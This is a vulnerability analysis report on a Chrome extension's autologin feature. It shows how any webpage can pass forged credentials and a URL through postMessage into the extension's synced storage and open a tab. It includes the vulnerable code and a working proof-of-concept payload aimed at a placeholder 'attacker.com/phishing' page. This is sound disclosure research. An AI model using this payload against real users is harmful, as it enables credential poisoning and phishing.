# CoCo Analysis: gkebigdndlcnlbdhmgjmiikdobbmkaom

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (chrome_storage_sync_set_sink)

---

## Sink 1: fetch_source → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gkebigdndlcnlbdhmgjmiikdobbmkaom/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';`

**Classification:** FALSE POSITIVE (for this specific sink)

**Reason:** References only CoCo framework mock code, not actual extension vulnerability.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_sync_set_sink (MAIN VULNERABILITY)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gkebigdndlcnlbdhmgjmiikdobbmkaom/opgen_generated_files/cs_0.js
Line 604: `window.addEventListener("message", function(event) {`
Line 605: `var Data=event.data;`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gkebigdndlcnlbdhmgjmiikdobbmkaom/opgen_generated_files/bg.js
Line 1458: `var recored = JSON.parse(decodeURIComponent(escape(atob(request.data))));`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
window.addEventListener("message", function(event) {
    var Data = event.data; // ← attacker-controlled via postMessage
    if (Data.type == 'SendAutologin') {
        chrome.runtime.sendMessage(Data, function(event) { // ← forwards to background
            if (chrome.runtime.lastError) {}
        });
    }
});

// Background script - Message handler (bg.js)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type == 'SendAutologin') {
        // Decodes attacker-controlled base64 data
        var recored = JSON.parse(decodeURIComponent(escape(atob(request.data)))); // ← attacker-controlled
        var filedarr = recored.flds ? recored.flds : recored.details;
        var url = '';
        var userName = '';
        var Password = '';
        var lastname = '';

        // Parses attacker-controlled fields
        for (var i = 0; i < filedarr.length; i++) {
            var filedlbl = filedarr[i]['label'];
            var fieldval = filedarr[i]['value'];
            var last = filedlbl.toLowerCase();
            filedlbl = last.replace(/\s/g, '');

            if (filedlbl.toLowerCase() == 'url') {
                url = fieldval; // ← attacker controls URL
            } else if (filedlbl.toLowerCase() == 'username' || filedlbl.toLowerCase() == 'email') {
                userName = fieldval; // ← attacker controls username
            } else if (filedlbl.toLowerCase() == 'password') {
                Password = fieldval; // ← attacker controls password
            } else if (filedlbl.toLowerCase() == 'lastname') {
                lastname = fieldval;
            }
        }

        if (url.indexOf("http") >= 0) {
            var newURL = url;
        } else {
            var newURL = 'http://' + url;
        }

        var FullData = {
            'userName': userName,
            'Password': Password,
            'lastname': lastname,
            'newURL': newURL
        };

        // Stores attacker-controlled credentials
        chrome.storage.sync.set({AutoData: JSON.stringify(FullData)}, function() {
            // ← attacker-controlled credentials stored
        });

        // Creates tab with attacker-controlled URL
        chrome.tabs.create({url: newURL}, createdTab => { // ← tab creation with attacker URL
            chrome.storage.sync.set({SteActiveTabId: createdTab.id}, function() {});
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from any webpage where content script runs (all URLs per manifest)

**Attack:**

```javascript
// From any webpage (content script matches all URLs)
// Create malicious payload with credentials
var payload = {
    type: 'SendAutologin',
    data: btoa(unescape(encodeURIComponent(JSON.stringify({
        flds: [
            {label: 'URL', value: 'https://attacker.com/phishing'},
            {label: 'Username', value: 'stolen@email.com'},
            {label: 'Password', value: 'hunter2'}
        ]
    }))))
};

// Send via postMessage - content script forwards to background
window.postMessage(payload, '*');

// Result: Extension stores attacker's fake credentials in sync storage
// and creates a tab to attacker.com/phishing
```

**Impact:** Any webpage can inject arbitrary credentials into the extension's sync storage via postMessage. The extension then:
1. Stores attacker-controlled username/password in chrome.storage.sync (synced across all user's Chrome browsers)
2. Creates tabs at attacker-controlled URLs
3. Potentially auto-fills these malicious credentials on attacker-controlled sites

This enables credential poisoning attacks where attackers can inject fake login data that syncs across the user's devices, potentially tricking users into entering credentials on phishing sites or exfiltrating legitimate credentials when the extension auto-fills on attacker domains.
